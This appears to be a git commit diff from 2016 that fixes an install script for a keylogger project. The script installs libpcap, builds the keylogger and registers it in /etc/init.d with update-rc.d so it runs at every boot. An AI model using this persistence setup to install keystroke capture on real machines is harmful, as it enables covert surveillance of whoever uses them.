474e9f75c289fa3ec2cf8fe8eda110588db5a138
Matias Grioni <matgrioni@gmail.com>
2016-11-28 20:36:19 -0500

    Update install and keylogger scripts to actually work properly

--- install.sh
+++ install.sh
@@ -1,11 +1,11 @@
 #!/bin/sh
 
 # Install libpcap-dev if it is already not on the system.
-sudo apt-get install libpcap-dev
+sudo apt-get install libpcap0.8-dev
 
 # Create the binaries.
 make -B
 
 chmod +x keylogger
-mv keylogger /etc/init.d/
-update-rc.d keylogger defaults
+sudo mv keylogger /etc/init.d/
+sudo update-rc.d keylogger defaults
